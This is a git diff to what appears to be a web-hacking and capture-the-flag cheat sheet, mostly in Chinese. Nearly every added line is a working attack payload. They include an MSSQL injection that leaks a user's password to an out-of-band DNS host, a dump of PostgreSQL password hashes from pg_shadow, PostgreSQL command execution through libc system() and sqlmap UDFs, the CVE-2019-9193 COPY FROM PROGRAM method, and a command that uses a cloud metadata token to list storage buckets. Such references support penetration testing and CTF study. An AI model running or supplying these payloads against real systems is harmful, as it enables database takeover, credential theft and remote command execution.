@@ -727,6 +727,7 @@ echo file_get_contents('bar/etc/passwd');
 - dl()
     - 載入module
     - `dl("rce.so")`
+    - This function was removed from most SAPIs in PHP 5.3.0, and was removed from PHP-FPM in PHP 7.0.0.
 
 - FFI
     - PHP 7.4 feature
@@ -1338,6 +1339,10 @@ pop graphic-context
     - `SELECT name FROM syscolumns WHERE id=object_id('news')`
     - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
     - `SELECT name FROM DBNAME..syscolumns WHERE id=(SELECT id FROM DBNAME..sysobjects WHERE name='TABLENAME')`
+
+- 一次性獲取全部資料
+    - `select quotename(name) from master..sysdatabases FOR XML PATH('')`
+
 - Union Based
     - Column型態必須相同
     - 可用`NULL`來避免
@@ -1346,6 +1351,7 @@ pop graphic-context
     - `id=1 and user=0`
 - Out of Band
     - `declare @p varchar(1024);set @p=(SELECT xxxx);exec('master..xp_dirtree "//'+@p+'.oob.kaibro.tw/a"')`
+    - `fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.oob.kaibro.tw',default)`
 - 判斷是否站庫分離
     - 客戶端主機名：`select host_name();`
     - 服務端主機名：`select @@servername; `
@@ -1571,6 +1577,8 @@ end
 - 註解
     - `--`
     - `/**/`
+- $$ 取代引號
+    - `SELECT $$This is a string$$`
 - 爆庫名
     - `SELECT datname FROM pg_database`
 - 爆表名
@@ -1579,22 +1587,32 @@ end
     - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
 - Dump all 
     - `array_to_string(array(select userid||':'||password from users),',')`
+- 列舉用戶 hash
+    - `SELECT usename, passwd FROM pg_shadow`
 - RCE
     - CVE-2019–9193
-    - 在 9.3 版本實作了 `COPY TO/FROM PROGRAM`
-    - 版本 9.3 ~ 11.2 預設啟用
-    - 讓 super user 和任何在 `pg_read_server_files` 群組的 user 可以執行任意指令
-    - 方法
-        - `DROP TABLE IF EXISTS cmd_exec;`
-        - `CREATE TABLE cmd_exec(cmd_output text);`
-        - `COPY cmd_exec FROM PROGRAM 'id';`
-        - `SELECT * FROM cmd_exec;`
+        - 在 9.3 版本實作了 `COPY TO/FROM PROGRAM`
+        - 版本 9.3 ~ 11.2 預設啟用
+        - 讓 super user 和任何在 `pg_read_server_files` 群組的 user 可以執行任意指令
+        - 方法
+            - `DROP TABLE IF EXISTS cmd_exec;`
+            - `CREATE TABLE cmd_exec(cmd_output text);`
+            - `COPY cmd_exec FROM PROGRAM 'id';`
+            - `SELECT * FROM cmd_exec;`
+    - 版本 8.2 以前
+        - `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;`
+        - `select system('id');`
+    - UDF
+        - sqlmap udf: https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql
+        - `CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;`
+        - `SELECT sys_eval("id");`
 - 其它
     - version()
     - current\_database()
     - user
         - current_user
         - `SELECT usename FROM pg_user;`
+    - getpgusername()
     - current\_schema
     - current\_query()
     - inet\_server\_addr()
@@ -1745,6 +1763,7 @@ HQL injection example (pwn2win 2017)
     - `/etc/samba/smb.conf`
     - `/etc/openldap/slapd.conf`
     - `/etc/mongod.conf`
+    - `/etc/krb5.conf`
     - `~/.tmux.conf`
     - `$TOMCAT_HOME/conf/tomcat-users.xml`
     - `$TOMCAT_HOME/conf/server.xml`
@@ -2532,7 +2551,7 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
 - http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
     - Access Token
     - Check the scope of access token: `curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=XXXXXXXXXXXXXXXXXXX"`
-    - Call the Google api with token: `curl "https://www.googleapis.com/storage/v1/b?project=<your_project_id>" \ -H "Authorization: Bearer ya29..."` (list buckets)
+    - Call the Google api with token: `curl "https://www.googleapis.com/storage/v1/b?project=<your_project_id>" -H "Authorization: Bearer ya29..."` (list buckets)
 - http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
     - SSH public key
 - http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
